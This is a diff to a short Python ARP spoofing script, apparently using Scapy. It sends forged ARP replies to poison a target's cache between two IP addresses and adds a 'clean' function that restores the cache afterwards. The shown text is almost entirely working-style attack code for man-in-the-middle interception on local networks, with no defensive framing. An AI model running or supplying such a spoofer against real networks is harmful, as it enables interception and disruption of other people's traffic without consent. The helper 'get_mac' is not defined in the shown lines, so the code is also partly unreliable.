@@ -27,11 +27,14 @@ def arspoof(ip_1, ip_2, regex_mac):
     if (re.match(regex_mac, trame.hwdst) == None):
         os.write(2, "[\033[31m-\033[00m] Error: mac adress must match with the regular expression.\n")
         exit(84)
-    print("[\033[32m+\033[00m] Begin emission:")
-    while (42):
-        send(trame, verbose = 0)
-        print(".\n[\033[32m+\033[00m] sent 1 packet to " + ip_2)
-        sleep(1)
+    print("[\033[32m+\033[00m] Sending packets to " + ip_2)
+    os.write(1, "[\033[32m+\033[00m] ")
+    srp(trame)
+
+def clean():
+    trame = ARP(op = 2, pdst = ip_2, hwdst = get_mac(ip_1))
+    print("[\033[32m+\033[00m] Cleaning target's cache")
+    send(trame, count = 5)
 
 regex_ip = "([0-9]{1,3}\.){3}[0-9]{1,3}"
 regex_mac = "([0-9a-f]{2}\:){5}[0-9a-f]{2}"
@@ -50,3 +53,4 @@ ip_1 = sys.argv[1]
 ip_2 = sys.argv[2]
 
 arspoof(ip_1, ip_2, regex_mac)
+clean()
